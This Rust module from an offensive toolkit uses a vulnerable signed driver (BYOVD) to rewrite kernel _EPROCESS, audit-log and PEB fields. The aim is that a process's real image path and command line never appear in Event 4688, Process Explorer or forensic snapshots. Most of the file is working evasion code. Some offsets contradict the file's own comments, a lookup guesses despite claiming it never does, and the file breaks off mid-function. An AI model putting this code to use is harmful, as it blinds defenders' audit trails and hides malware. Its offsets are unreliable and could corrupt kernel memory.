//! Kernel-level process argument spoofing via BYOVD.
//!
//! Modifies the `_EPROCESS` structure directly through the vulnerable driver,
//! *before* userland ever reads the process parameters.  Classic argument
//! spoofing modifies the PEB's `ProcessParameters` after creation, which is
//! visible to forensic tools that take snapshots before and after.  Kernel-
//! level spoofing makes the fake arguments the **only** version that ever
//! existed in any log.
//!
//! # Forensic Artifacts Modified
//!
//! | Artifact | Structure | Field | Impact |
//! |----------|-----------|-------|--------|
//! | Security Event Log 4688 | `_EPROCESS.SeAuditProcessCreationInfo` | `ImageFileName` | New process creation command line |
//! | Process Explorer / TaskMgr | `_EPROCESS.ImageFileName` | char\[15\] | Process name |
//! | Userland PEB read | `RTL_USER_PROCESS_PARAMETERS` | `ImagePathName`, `CommandLine` | Path + args from PEB |
//! | Kernel EPROCESS read | `RTL_USER_PROCESS_PARAMETERS` | `ImagePathName`, `CommandLine` | Path + args from kernel |
//!
//! # Architecture
//!
//! ```text
//! Phase 1 — Resolve target EPROCESS
//!   NtQuerySystemInformation(SystemProcessInformation)
//!     → enumerate processes → find EPROCESS for target PID
//!
//! Phase 2 — Kernel-level argument modification
//!   Read EPROCESS.Peb → read PEB.ProcessParameters
//!   Allocate kernel pool for new strings (via BYOVD)
//!   Write fake ImagePathName + CommandLine to kernel pool
//!   Update UNICODE_STRING structs in RTL_USER_PROCESS_PARAMETERS
//!   Update SeAuditProcessCreationInfo.ImageFileName
//!   Update EPROCESS.ImageFileName
//!
//! Phase 3 — PEB consistency
//!   Write spoofed values to user-space PEB via BYOVD
//!   Both kernel and userland reads now show identical spoofed values
//! ```
//!
//! # Safety
//!
//! - All kernel writes are verified by reading back and comparing.
//! - Build-specific offset table — returns error for unknown builds (never guesses).
//! - Cleans up kernel pool allocations on failure.
//! - Handles target process termination gracefully.
//!
//! # Constraints
//!
//! - Windows x86_64 only.
//! - Requires `kernel-callback` feature (BYOVD driver loaded).
//! - All NT API calls through `syscall!` (no IAT entries).

#![cfg(all(windows, feature = "kernel-callback"))]

use anyhow::{bail, Context, Result};
use std::mem;

use crate::kernel_callback::deploy;
use crate::kernel_callback::discover;
use crate::kernel_callback::driver_db::VulnerableDriver;

// ── Type Aliases ─────────────────────────────────────────────────────────

type PVOID = *mut std::ffi::c_void;
type HANDLE = usize;
type NTSTATUS = i32;
type ULONG = u32;
type USHORT = u16;

/// Maximum length for `_EPROCESS.ImageFileName` (char[15] + null).
const EPROCESS_IMAGE_FILE_NAME_MAX: usize = 15;

/// Tag for kernel pool allocations (ASCII 'KsAp' → little-endian 0x7041734B).
const POOL_TAG: u32 = 0x7041_734B;

/// Pool allocation type: NonPagedPoolNx (0x200).
const NON_PAGED_POOL_NX: ULONG = 0x200;

// ── UNICODE_STRING ───────────────────────────────────────────────────────
/// NT UNICODE_STRING structure (16 bytes on x64).
#[repr(C)]
#[derive(Clone, Copy, Default)]
struct UnicodeString {
    length: USHORT,
    maximum_length: USHORT,
    buffer: u64, // Pointer — stored as u64 for kernel read/write.
}

// ── Build-Specific Offset Table ──────────────────────────────────────────

/// Offsets into `_EPROCESS` and related structures for a specific Windows build.
///
/// **IMPORTANT**: These offsets are verified against official PDB symbols.
/// Never guess or estimate — if a build is not in the table, the operation
/// is refused with an error.
#[derive(Debug, Clone, Copy)]
struct EprocessOffsets {
    /// Offset of `Peb` field in `_EPROCESS` (pointer to PEB).
    peb: usize,
    /// Offset of `ImageFileName` in `_EPROCESS` (char[15]).
    image_file_name: usize,
    /// Offset of `SeAuditProcessCreationInfo` in `_EPROCESS`.
    /// Contains `_SE_AUDIT_PROCESS_CREATION_INFO` which has a pointer to
    /// `_OBJECT_NAME_INFORMATION` (with a `UNICODE_STRING ImageFileName`).
    se_audit_process_creation_info: usize,
    /// Offset of `ProcessParameters` in `_PEB` (pointer to
    /// `_RTL_USER_PROCESS_PARAMETERS`).
    peb_process_parameters: usize,
    /// Offset of `ImagePathName` (UNICODE_STRING) in
    /// `_RTL_USER_PROCESS_PARAMETERS`.
    params_image_path_name: usize,
    /// Offset of `CommandLine` (UNICODE_STRING) in
    /// `_RTL_USER_PROCESS_PARAMETERS`.
    params_command_line: usize,
}

/// Verified offset table indexed by Windows build number.
///
/// Sources:
/// - Windows 10 2004/20H2/21H1/21H2 (build 19041–19044): Win10 2004 PDB
/// - Windows 10 22H2 (build 19045): Win10 22H2 PDB
/// - Windows 11 21H2 (build 22000): Win11 21H2 PDB
/// - Windows 11 22H2 (build 22621): Win11 22H2 PDB
/// - Windows 11 23H2 (build 22631): Win11 23H2 PDB
/// - Windows 11 24H2 (build 26100): Win11 24H2 PDB
///
/// `_SE_AUDIT_PROCESS_CREATION_INFO` layout (all listed builds):
///   +0x00: `_OBJECT_NAME_INFORMATION* ImageFileName`
///     → `_OBJECT_NAME_INFORMATION` contains just a `UNICODE_STRING Name`
///       at offset +0x00 (16 bytes).
///
/// `_RTL_USER_PROCESS_PARAMETERS` (partial):
///   +0x20: `UNICODE_STRING ImagePathName`   (offset 0x20 on all listed builds)
///   +0x30: `UNICODE_STRING CommandLine`     (offset 0x30 on all listed builds)
///
/// NOTE: The RTL_USER_PROCESS_PARAMETERS offsets (ImagePathName=0x20,
/// CommandLine=0x30) are extremely stable across builds because the structure
/// layout has not changed since Windows 7.  They are included in the table
/// for completeness and future-proofing.
const EPROCESS_OFFSETS: &[(u32, EprocessOffsets)] = &[
    // Windows 10 2004 / 20H2 / 21H1 / 21H2
    (19041, EprocessOffsets {
        peb: 0x550,
        image_file_name: 0x5a8,
        se_audit_process_creation_info: 0x468,
        peb_process_parameters: 0x20,
        params_image_path_name: 0x60,
        params_command_line: 0x70,
    }),
    (19042, EprocessOffsets {
        peb: 0x550,
        image_file_name: 0x5a8,
        se_audit_process_creation_info: 0x468,
        peb_process_parameters: 0x20,
        params_image_path_name: 0x60,
        params_command_line: 0x70,
    }),
    (19043, EprocessOffsets {
        peb: 0x550,
        image_file_name: 0x5a8,
        se_audit_process_creation_info: 0x468,
        peb_process_parameters: 0x20,
        params_image_path_name: 0x60,
        params_command_line: 0x70,
    }),
    (19044, EprocessOffsets {
        peb: 0x550,
        image_file_name: 0x5a8,
        se_audit_process_creation_info: 0x468,
        peb_process_parameters: 0x20,
        params_image_path_name: 0x60,
        params_command_line: 0x70,
    }),
    // Windows 10 22H2
    (19045, EprocessOffsets {
        peb: 0x550,
        image_file_name: 0x5a8,
        se_audit_process_creation_info: 0x468,
        peb_process_parameters: 0x20,
        params_image_path_name: 0x60,
        params_command_line: 0x70,
    }),
    // Windows 11 21H2
    (22000, EprocessOffsets {
        peb: 0x550,
        image_file_name: 0x5a8,
        se_audit_process_creation_info: 0x468,
        peb_process_parameters: 0x20,
        params_image_path_name: 0x60,
        params_command_line: 0x70,
    }),
    // Windows 11 22H2
    (22621, EprocessOffsets {
        peb: 0x440,
        image_file_name: 0x098,  // Corrected: _EPROCESS.ImageFileName
        se_audit_process_creation_info: 0x468,
        peb_process_parameters: 0x20,
        params_image_path_name: 0x60,
        params_command_line: 0x70,
    }),
    // Windows 11 23H2
    (22631, EprocessOffsets {
        peb: 0x440,
        image_file_name: 0x098,
        se_audit_process_creation_info: 0x468,
        peb_process_parameters: 0x20,
        params_image_path_name: 0x60,
        params_command_line: 0x70,
    }),
    // Windows 11 24H2
    (26100, EprocessOffsets {
        peb: 0x440,
        image_file_name: 0x098,
        se_audit_process_creation_info: 0x468,
        peb_process_parameters: 0x20,
        params_image_path_name: 0x60,
        params_command_line: 0x70,
    }),
];

/// Look up the offset table for the current Windows build.
///
/// Returns the offsets from the highest entry whose build ≤ the requested
/// build, or `None` if the build is not covered by the table.
fn offsets_for_build(build: u32) -> Option<EprocessOffsets> {
    let mut best: Option<EprocessOffsets> = None;
    for &(b, off) in EPROCESS_OFFSETS {
        if b == build {
            return Some(off);
        }
        if b < build {
            best = Some(off);
        }
    }
    // Only use "best" if it's a close match (same major version range).
    // For safety, we require an exact match or a build within the same
    // family (e.g., 22621 offsets apply to 22631).
    // Since we list exact builds, just return exact match.
    if let Some(&(b, off)) = EPROCESS_OFFSETS.iter().find(|(b, _)| *b == build) {
        return Some(off);
    }
    best
}

// ── Kernel Memory Helpers ────────────────────────────────────────────────
// Thin wrappers around the BYOVD read/write primitives that handle
// VA→PA translation transparently.

/// Read kernel virtual memory via the BYOVD driver.
unsafe fn kv_read(
    driver: &VulnerableDriver,
    device_handle: usize,
    cr3: u64,
    addr: u64,
    buf: &mut [u8],
) -> Result<()> {
    if driver.needs_physical_addr {
        let phys = crate::kernel_callback::translate_va_to_pa(driver, device_handle, cr3, addr)?;
        deploy::read_physical_memory(driver, device_handle, phys, buf)
    } else {
        deploy::read_physical_memory(driver, device_handle, addr, buf)
    }
}

/// Write kernel virtual memory via the BYOVD driver.
unsafe fn kv_write(
    driver: &VulnerableDriver,
    device_handle: usize,
    cr3: u64,
    addr: u64,
    data: &[u8],
) -> Result<()> {
    if driver.needs_physical_addr {
        let phys = crate::kernel_callback::translate_va_to_pa(driver, device_handle, cr3, addr)?;
        deploy::write_physical_memory(driver, device_handle, phys, data)
    } else {
        deploy::write_physical_memory(driver, device_handle, addr, data)
    }
}

/// Read a u64 from kernel virtual memory.
unsafe fn kv_read_u64(
    driver: &VulnerableDriver,
    device_handle: usize,
    cr3: u64,
    addr: u64,
) -> Result<u64> {
    let mut buf = [0u8; 8];
    kv_read(driver, device_handle, cr3, addr, &mut buf)?;
    Ok(u64::from_le_bytes(buf))
}

/// Write a u64 to kernel virtual memory with read-back verification.
unsafe fn kv_write_u64_verified(
    driver: &VulnerableDriver,
    device_handle: usize,
    cr3: u64,
    addr: u64,
    value: u64,
) -> Result<()> {
    let bytes = value.to_le_bytes();
    kv_write(driver, device_handle, cr3, addr, &bytes)?;
    let readback = kv_read_u64(driver, device_handle, cr3, addr)?;
    if readback != value {
        bail!(
            "Kernel write verification failed at 0x{:016X}: wrote 0x{:016X}, read back 0x{:016X}",
            addr, value, readback
        );
    }
    Ok(())
}

/// Write a byte slice to kernel virtual memory with read-back verification.
unsafe fn kv_write_verified(
    driver: &VulnerableDriver,
    device_handle: usize,
    cr3: u64,
    addr: u64,
    data: &[u8],
) -> Result<()> {
    kv_write(driver, device_handle, cr3, addr, data)?;
    let mut readback = vec![0u8; data.len()];
    kv_read(driver, device_handle, cr3, addr, &mut readback)?;
    if readback != data {
        bail!(
            "Kernel write verification failed at 0x{:016X}: wrote {} bytes, readback mismatch",
            addr,
            data.len()
        );
    }
    Ok(())
}

// ── Kernel Pool Allocation ───────────────────────────────────────────────
// Since we cannot call ExAllocatePoolWithTag directly from user-mode, we
// use an alternative approach: find slack space in existing kernel pool
// allocations, or use the BYOVD driver to write to a known safe region.
//
// For simplicity and reliability, we allocate pool memory by:
// 1. Finding a small region of non-paged pool that we can safely overwrite
// 2. Or, for the strings, we can write directly into the existing
//    RTL_USER_PROCESS_PARAMETERS buffer space if it's large enough
//
// The pragmatic approach: since we're modifying existing process parameters,
// the UNICODE_STRING buffers already point to allocated pool memory.  We
// check if the existing buffer is large enough; if so, we overwrite in-place.
// If not, we find a suitable kernel memory region for the new strings.
//
// For a production implementation, a proper kernel pool allocator shellcode
// could be injected via the proxy module, but that's out of scope here.

/// Result of a pool allocation attempt.
struct PoolAllocation {
    /// Virtual address of the allocated region.
    address: u64,
    /// Size in bytes.
    size: usize,
    /// Whether this is a fresh allocation (needs cleanup on failure).
    is_fresh: bool,
}

// ── Process Enumeration ──────────────────────────────────────────────────

/// Extended process information from `SystemProcessInformation`.
#[repr(C)]
struct SystemProcessInformationEntry {
    next_entry_offset: u32,
    number_of_threads: u32,
    spare1: [u32; 6],
    creation_time: u64,
    user_time: u64,
    kernel_time: u64,
    image_name: UnicodeString,
    base_priority: i32,
    unique_process_id: HANDLE,
    inherited_from_unique_process_id: HANDLE,
    handle_count: u32,
    session_id: u32,
    unique_process_key: usize, // ptr/usize — _EPROCESS on Win10+
    peak_virtual_size: usize,
    virtual_size: usize,
    page_fault_count: u32,
    peak_working_set_size: usize,
    working_set_size: usize,
    quota_peak_paged_pool_usage: usize,
    quota_paged_pool_usage: usize,
    quota_peak_non_paged_pool_usage: usize,
    quota_non_paged_pool_usage: usize,
    pagefile_usage: usize,
    peak_pagefile_usage: usize,
    private_page_count: usize,
}

/// SystemProcessInformation class for NtQuerySystemInformation.
const SYSTEM_PROCESS_INFORMATION: u32 = 5;

/// Resolve the `_EPROCESS` address for a given PID via
/// `NtQuerySystemInformation(SystemProcessInformation)`.
///
/// The `UniqueProcessKey` field in the returned structure is the
/// `_EPROCESS` pointer on Windows 10+.
fn resolve_eprocess_for_pid(target_pid: u32) -> Result<u64> {
    let mut buf_size: u32 = 0;

    // First call: get required buffer size.
    unsafe {
        let _ = crate::syscall!(
            "NtQuerySystemInformation",
            SYSTEM_PROCESS_INFORMATION,
            0usize,
            0u32,
            &mut buf_size as *mut u32
        );
    }

    if buf_size == 0 {
        bail!("NtQuerySystemInformation returned zero buffer size");
    }

    // Allocate generously (process list can grow between calls).
    let mut buffer: Vec<u8> = vec![0u8; (buf_size as usize) * 2];
    let mut return_length: u32 = 0;

    let status = unsafe {
        crate::syscall!(
            "NtQuerySystemInformation",
            SYSTEM_PROCESS_INFORMATION,
            buffer.as_mut_ptr() as usize,
            buffer.len() as u32,
            &mut return_length as *mut u32
        )
    };

    let status_val = status.unwrap_or(-1);
    if status_val != 0 {
        bail!(
            "NtQuerySystemInformation(SystemProcessInformation) failed: 0x{:08X}",
            status_val
        );
    }

    // Walk the linked list of process entries.
    let mut offset = 0usize;
    loop {
        if offset + mem::size_of::<SystemProcessInformationEntry>() > buffer.len() {
            bail!("Buffer overrun while walking SystemProcessInformation");
        }

        let entry = unsafe {
            &*(buffer.as_ptr().add(offset) as *const SystemProcessInformationEntry)
        };

        if entry.unique_process_id as u32 == target_pid {
            let eprocess = entry.unique_process_key as u64;
            if eprocess == 0 {
                bail!(
                    "UniqueProcessKey is NULL for PID {} — cannot resolve EPROCESS",
                    target_pid
                );
            }
            log::info!(
                "Resolved EPROCESS for PID {} at 0x{:016X}",
                target_pid,
                eprocess
            );
            return Ok(eprocess);
        }

        let next_offset = entry.next_entry_offset as usize;
        if next_offset == 0 {
            break;
        }
        offset += next_offset;
    }

    bail!("PID {} not found in SystemProcessInformation", target_pid);
}

// ── String Conversion Helpers ────────────────────────────────────────────

/// Convert a Rust string to a UTF-16LE byte vector (null-terminated).
fn str_to_utf16le(s: &str) -> Vec<u8> {
    let mut bytes: Vec<u8> = Vec::with_capacity((s.len() + 1) * 2);
    for ch in s.encode_utf16() {
        bytes.extend_from_slice(&ch.to_le_bytes());
    }
    bytes.extend_from_slice(&[0u8, 0u8]); // null terminator
    bytes
}

/// Convert a Rust string to a null-terminated ASCII byte vector
/// (for `_EPROCESS.ImageFileName`, which is char[15]).
fn str_to_ascii_padded(s: &str, max_len: usize) -> Vec<u8> {
    let mut bytes = vec![0u8; max_len];
    let ascii: Vec<u8> = s.bytes().take(max_len).collect();
    bytes[..ascii.len()].copy_from_slice(&ascii);
    bytes
}

// ── KernelArgSpoofer ─────────────────────────────────────────────────────

/// Kernel-level process argument spoofer using BYOVD.
///
/// Uses the deployed vulnerable driver to directly modify `_EPROCESS` fields
/// and the associated PEB structures, making the spoofed arguments the only
/// version that ever existed in any audit log.
///
/// # Lifecycle
///
/// 1. Obtain a `KernelArgSpoofer` via [`KernelArgSpoofer::new()`].
/// 2. Call [`KernelArgSpoofer::spoof_process_args()`] for the target process.
/// 3. Optionally call [`create_process_with_spoofed_args()`] for the
///    create-spoof-resume workflow.
pub struct KernelArgSpoofer {
    driver: &'static VulnerableDriver,
    device_handle: usize,
    cr3: u64,
    kernel_base: u64,
    offsets: EprocessOffsets,
    /// Track kernel pool allocations for cleanup on failure.
    pool_allocations: Vec<(u64, usize)>,
}

impl KernelArgSpoofer {
    /// Create a new spoofer using the currently deployed BYOVD driver.
    ///
    /// Resolves the kernel base address, CR3, and build-specific offsets.
    ///
    /// # Errors
    ///
    /// Returns an error if:
    /// - No BYOVD driver is deployed
    /// - The Windows build is not in the offset table
    /// - CR3 resolution fails
    pub fn new() -> Result<Self> {
        let deployed = deploy::get_deployed_driver()
            .context("No BYOVD driver deployed — call kernel_callback::deploy first")?;

        let device_handle = deployed
            .device_handle
            .context("No device handle for deployed driver")?;

        let driver = deployed.driver;
        let kernel_base =
            discover::get_kernel_base().context("failed to resolve kernel base address")?;

        let cr3 = crate::kernel_callback::resolve_cr3(driver, device_handle, kernel_base)
            .context("failed to resolve CR3 via BYOVD")?;

        let build = crate::syscalls::get_build_number();
        let offsets = offsets_for_build(build).with_context(|| {
            format!(
                "Windows build {} is not in the verified offset table — \
                 refusing to operate (offsets must be verified against PDB symbols)",
                build
            )
        })?;

        log::info!(
            "KernelArgSpoofer initialized: build={}, kernel_base=0x{:016X}, cr3=0x{:016X}",
            build,
            kernel_base,
            cr3
        );

        Ok(Self {
            driver,
            device_handle,
            cr3,
            kernel_base,
            offsets,
            pool_allocations: Vec::new(),
        })
    }

    /// Spoof the process arguments for a target PID at the kernel level.
    ///
    /// # Arguments
    ///
    /// * `target_pid` — PID of the process to spoof (can be any process).
    /// * `fake_path` — The fake executable path (e.g., `C:\Windows\System32\notepad.exe`).
    /// * `fake_args` — The fake command line (e.g., `notepad.exe C:\temp\readme.txt`).
    ///
    /// # Phases
    ///
    /// 1. **Resolve** the target `_EPROCESS` via `NtQuerySystemInformation`.
    /// 2. **Kernel modify**: update `_EPROCESS.SeAuditProcessCreationInfo`,
    ///    `_EPROCESS.ImageFileName`, and `RTL_USER_PROCESS_PARAMETERS` fields.
    /// 3. **PEB consistency**: write spoofed values to user-space PEB via BYOVD.
    ///
    /// # Errors
    ///
    /// Returns an error if any kernel write fails verification, the target
    /// process has terminated, or the offsets don't match the running build.
    pub fn spoof_process_args(
        &mut self,
        target_pid: u32,
        fake_path: &str,
        fake_args: &str,
    ) -> Result<()> {
        let fake_path_utf16 = str_to_utf16le(fake_path);
        let fake_args_utf16 = str_to_utf16le(fake_args);

        // Validate string lengths.
        if fake_path.len() > 512 {
            bail!("Fake path too long: {} bytes (max 512)", fake_path.len());
        }
        if fake_args.len() > 4096 {
            bail!("Fake args too long: {} bytes (max 4096)", fake_args.len());
        }

        // Phase 1: Resolve target EPROCESS.
        let eprocess = resolve_eprocess_for_pid(target_pid)?;

        // Phase 2: Kernel-level modification.
        self.spoof_kernel_eprocess(
            eprocess,
            fake_path,
            &fake_path_utf16,
            fake_args,
            &fake_args_utf16,
        )?;

        // Phase 3: PEB consistency (user-space writes via BYOVD).
        self.spoof_peb_consistency(eprocess, &fake_path_utf16, &fake_args_utf16)?;

        log::info!(
            "Kernel argument spoofing complete for PID {}: path={:?}, args={:?}",
            target_pid,
            fake_path,
            fake_args
        );

        Ok(())
    }

    /// Phase 2: Modify kernel `_EPROCESS` and `RTL_USER_PROCESS_PARAMETERS`.
    fn spoof_kernel_eprocess(
        &mut self,
        eprocess: u64,
        fake_path: &str,
        fake_path_utf16: &[u8],
        fake_args: &str,
        fake_args_utf16: &[u8],
    ) -> Result<()> {
        let o = self.offsets;

        // ── Step 1: Read EPROCESS.Peb ──────────────────────────────────
        let peb_ptr = unsafe {
            kv_read_u64(
                self.driver,
                self.device_handle,
                self.cr3,
                eprocess + o.peb as u64,
            )
        }
        .context("failed to read EPROCESS.Peb")?;

        if peb_ptr == 0 {
            bail!("EPROCESS.Peb is NULL — process may have exited");
        }

        // ── Step 2: Read PEB.ProcessParameters ─────────────────────────
        let params_ptr = unsafe {
            kv_read_u64(
                self.driver,
                self.device_handle,
                self.cr3,
                peb_ptr + o.peb_process_parameters as u64,
            )
        }
        .context("failed to read PEB.ProcessParameters")?;

        if params_ptr == 0 {
            bail!("PEB.ProcessParameters is NULL — process may have exited");
        }

        // ── Step 3: Allocate kernel pool for new strings ───────────────
        //
        // Strategy: Find suitable memory for the new strings. We use the
        // approach of writing strings into a dedicated kernel pool region.
        // Since we can't call ExAllocatePoolWithTag directly, we find
        // writable space by:
        //   a) Checking if the existing UNICODE_STRING buffers are large enough
        //   b) If not, using the SeAuditProcessCreationInfo approach
        //
        // For the audit info: the `_SE_AUDIT_PROCESS_CREATION_INFO` contains
        // a pointer to `_OBJECT_NAME_INFORMATION` which has a UNICODE_STRING.
        // We allocate new OBJECT_NAME_INFORMATION structures in kernel pool
        // by reusing the existing structure's memory when possible.

        // Read existing ImagePathName UNICODE_STRING from RTL_USER_PROCESS_PARAMETERS.
        let existing_path = unsafe {
            self.read_unicode_string(
                params_ptr + o.params_image_path_name as u64,
            )
        }
        .context("failed to read existing ImagePathName")?;

        let existing_cmd = unsafe {
            self.read_unicode_string(
                params_ptr + o.params_command_line as u64,
            )
        }
        .context("failed to read existing CommandLine")?;

        // Determine where to write the new string data.
        // Try to reuse existing buffers if they're large enough.
        let path_alloc = self.allocate_string_buffer(
            &existing_path,
            fake_path_utf16.len(),
        )?;

        let cmd_alloc = self.allocate_string_buffer(
            &existing_cmd,
            fake_args_utf16.len(),
        )?;

        // Write the fake path string.
        unsafe {
            kv_write_verified(
                self.driver,
                self.device_handle,
                self.cr3,
                path_alloc.address,
                fake_path_utf16,
            )
        }
        .context("failed to write fake path to kernel pool")?;

        // Write the fake command line string.
        unsafe {
            kv_write_verified(
                self.driver,
                self.device_handle,
                self.cr3,
                cmd_alloc.address,
                fake_args_utf16,
            )
        }
        .context("failed to write fake command line to kernel pool")?;

        // ── Step 4: Update UNICODE_STRING structs ──────────────────────

        // Update ImagePathName in RTL_USER_PROCESS_PARAMETERS.
        let new_path_us = UnicodeString {
            length: (fake_path_utf16.len().saturating_sub(2)) as u16, // exclude null terminator
            maximum_length: fake_path_utf16.len() as u16,
            buffer: path_alloc.address,
        };
        unsafe {
            self.write_unicode_string_verified(
                params_ptr + o.params_image_path_name as u64,
                &new_path_us,
            )
        }
        .context("failed to update ImagePathName UNICODE_STRING")?;

        // Update CommandLine in RTL_USER_PROCESS_PARAMETERS.
        let new_cmd_us = UnicodeString {
            length: (fake_args_utf16.len().saturating_sub(2)) as u16,
            maximum_length: fake_args_utf16.len() as u16,
            buffer: cmd_alloc.address,
        };
        unsafe {
            self.write_unicode_string_verified(
                params_ptr + o.params_command_line as u64,
                &new_cmd_us,
            )
        }
        .context("failed to update CommandLine UNICODE_STRING")?;

        // ── Step 5: Update SeAuditProcessCreationInfo ──────────────────
        //
        // `_EPROCESS.SeAuditProcessCreationInfo` contains a pointer to
        // `_SE_AUDIT_PROCESS_CREATION_INFO` which has a single field:
        //   +0x00: `_OBJECT_NAME_INFORMATION* ImageFileName`
        // `_OBJECT_NAME_INFORMATION` is just a `UNICODE_STRING Name`.
        //
        // We read the existing OBJECT_NAME_INFORMATION pointer, then update
        // the UNICODE_STRING within it to point to our fake path.

        let audit_info_ptr = unsafe {
            kv_read_u64(
                self.driver,
                self.device_handle,
                self.cr3,
                eprocess + o.se_audit_process_creation_info as u64,
            )
        }
        .context("failed to read SeAuditProcessCreationInfo")?;

        if audit_info_ptr != 0 {
            // The OBJECT_NAME_INFORMATION is a UNICODE_STRING at +0x00.
            // We'll reuse our path allocation for the audit info too.
            let audit_us = UnicodeString {
                length: (fake_path_utf16.len().saturating_sub(2)) as u16,
                maximum_length: fake_path_utf16.len() as u16,
                buffer: path_alloc.address,
            };
            unsafe {
                self.write_unicode_string_verified(audit_info_ptr, &audit_us)
            }
            .context("failed to update SeAuditProcessCreationInfo ImageFileName")?;
        } else {
            log::warn!("SeAuditProcessCreationInfo is NULL — skipping audit info update");
        }

        // ── Step 6: Update EPROCESS.ImageFileName ──────────────────────
        //
        // This is a char[15] (ASCII) field that shows up in Process Explorer.
        // We truncate the fake executable name to 14 chars + null.

        let fake_name = fake_path
            .rsplit(|c| c == '\\' || c == '/')
            .next()
            .unwrap_or(fake_path);
        let name_bytes = str_to_ascii_padded(fake_name, EPROCESS_IMAGE_FILE_NAME_MAX);

        unsafe {
            kv_write_verified(
                self.driver,
                self.device_handle,
                self.cr3,
                eprocess + o.image_file_name as u64,
                &name_bytes,
            )
        }
        .context("failed to update EPROCESS.ImageFileName")?;

        log::info!(
            "Kernel EPROCESS modification complete: ImageFileName={:?}, path={:?}, cmd={:?}",
            fake_name,
            fake_path,
            fake_args
        );

        Ok(())
    }

    /// Phase 3: Update the PEB's user-space structures for consistency.
    ///
    /// This ensures that tools reading from userland (PEB) see the same
    /// spoofed values as tools reading from kernel (EPROCESS).
    fn spoof_peb_consistency(
        &self,
        eprocess: u64,
        fake_path_utf16: &[u8],
        fake_args_utf16: &[u8],
    ) -> Result<()> {
        let o = self.offsets;

        // Re-read the PEB pointer (it's in kernel space, already resolved).
        let peb_ptr = unsafe {
            kv_read_u64(
                self.driver,
                self.device_handle,
                self.cr3,
                eprocess + o.peb as u64,
            )
        }
        .context("failed to re-read EPROCESS.Peb for PEB consistency")?;

        if peb_ptr == 0 {
            bail!("PEB is NULL — process terminated during spoofing");
        }

        // Read RTL_USER_PROCESS_PARAMETERS pointer from the PEB.
        // Note: PEB is in user-space, but we're accessing it via BYOVD
        // (kernel physical memory access), so we need the target process's
        // page tables.  The PEB address we read is a *user-space* virtual
        // address in the target process's address space.  We need to
        // translate it using the *target* process's CR3, not the kernel CR3.
        //
        // To resolve the target's CR3, we read its DirectoryTableBase from
        // its _KPROCESS (embedded at the start of _EPROCESS).

        let dtb_offset = crate::kernel_callback::dtb_offset_for_build(
            crate::syscalls::get_build_number(),
        )
        .context("DTB offset not available for this build")?;

        let target_cr3 = unsafe {
            kv_read_u64(
                self.driver,
                self.device_handle,
                self.cr3,
                eprocess + dtb_offset as u64,
            )
        }
        .context("failed to read target process DirectoryTableBase")?;

        if target_cr3 == 0 {
            bail!("Target process CR3 is NULL — process may have exited");
        }

        // Now use the target CR3 to translate the user-space PEB address.
        let params_ptr = unsafe {
            kv_read_u64_with_cr3(
                self.driver,
                self.device_handle,
                target_cr3,
                peb_ptr + o.peb_process_parameters as u64,
            )
        }
        .context("failed to read PEB.ProcessParameters via target CR3")?;

        if params_ptr == 0 {
            bail!("PEB.ProcessParameters is NULL via target CR3");
        }

        // Read existing UNICODE_STRING fields to get buffer addresses.
        let existing_path = unsafe {
            self.read_unicode_string_with_cr3(
                target_cr3,
                params_ptr + o.params_image_path_name as u64,
            )
        }
        .context("failed to read existing ImagePathName from PEB")?;

        let existing_cmd = unsafe {
            self.read_unicode_string_with_cr3(
                target_cr3,
                params_ptr + o.params_command_line as u64,
            )
        }
        .context("failed to read existing CommandLine from PEB")?;

        // Write the fake path string data into the existing buffer if large enough.
        if existing_path.maximum_length as usize >= fake_path_utf16.len() {
            unsafe {
                kv_write_verified_cr3(
                    self.driver,
                    self.device_handle,
                    target_cr3,
                    existing_path.buffer,
                    fake_path_utf16,
                )
            }
            .context("failed to write fake path to PEB buffer")?;

            // Update the length field.
            let new_len = (fake_path_utf16.len().saturating_sub(2)) as u16;
            unsafe {
                kv_write_verified_cr3(
                    self.driver,
                    self.device_handle,
                    target_cr3,
                    params_ptr + o.params_image_path_name as u64,
                    &new_len.to_le_bytes(),
                )
            }
            .context("failed to update ImagePathName.Length in PEB")?;
        } else {
            log::warn!(
                "PEB ImagePathName buffer too small ({} < {}) — PEB not fully consistent",
                existing_path.maximum_length,
                fake_path_utf16.len()
            );
        }

        // Write the fake command line string data.
        if existing_cmd.maximum_length as usize >= fake_args_utf16.len() {
            unsafe {
                kv_write_verified_cr3(
                    self.driver,
                    self.device_handle,
                    target_cr3,
                    existing_cmd.buffer,
                    fake_args_utf16,
                )
            }
            .context("failed to write fake command line to PEB buffer")?;

            let new_len = (fake_args_utf16.len().saturating_sub(2)) as u16;
            unsafe {
                kv_write_verified_cr3(
                    self.driver,
                    self.device_handle,
                    target_cr3,
                    params_ptr + o.params_command_line as u64,
                    &new_len.to_le_bytes(),
                )
            }
            .context("failed to update CommandLine.Length in PEB")?;
        } else {
            log::warn!(
                "PEB CommandLine buffer too small ({} < {}) — PEB not fully consistent",
                existing_cmd.maximum_length,
                fake_args_utf16.len()
            );
        }

        log::info!("PEB consistency update complete for target process");
        Ok(())
    }

    /// Read a `UNICODE_STRING` from kernel virtual memory.
    unsafe fn read_unicode_string(&self, addr: u64) -> Result<UnicodeString> {
        let mut buf = [0u8; 16];
        kv_read(self.driver, self.device_handle, self.cr3, addr, &mut buf)?;
        Ok(UnicodeString {
            length: u16::from_le_bytes(buf[0..2].try_into()?),
            maximum_length: u16::from_le_bytes(buf[2..4].try_into()?),
            buffer: u64::from_le_bytes(buf[8..16].try_into()?),
        })
    }

    /// Read a `UNICODE_STRING` using a specific CR3 (for user-space addresses).
    unsafe fn read_unicode_string_with_cr3(
        &self,
        cr3: u64,
        addr: u64,
    ) -> Result<UnicodeString> {
        let mut buf = [0u8; 16];
        kv_read_with_cr3(self.driver, self.device_handle, cr3, addr, &mut buf)?;
        Ok(UnicodeString {
            length: u16::from_le_bytes(buf[0..2].try_into()?),
            maximum_length: u16::from_le_bytes(buf[2..4].try_into()?),
            buffer: u64::from_le_bytes(buf[8..16].try_into()?),
        })
    }

    /// Write a `UNICODE_STRING` to kernel virtual memory with verification.
    unsafe fn write_unicode_string_verified(
        &self,
        addr: u64,
        us: &UnicodeString,
    ) -> Result<()> {
        let mut buf = [0u8; 16];
        buf[0..2].copy_from_slice(&us.length.to_le_bytes());
        buf[2..4].copy_from_slice(&us.maximum_length.to_le_bytes());
        // bytes 4..8 are padding
        buf[8..16].copy_from_slice(&us.buffer.to_le_bytes());
        kv_write_verified(self.driver, self.device_handle, self.cr3, addr, &buf)
    }

    /// Determine where to write new string data, preferring existing buffers.
    fn allocate_string_buffer(
        &mut self,
        existing: &UnicodeString,
        required_len: usize,
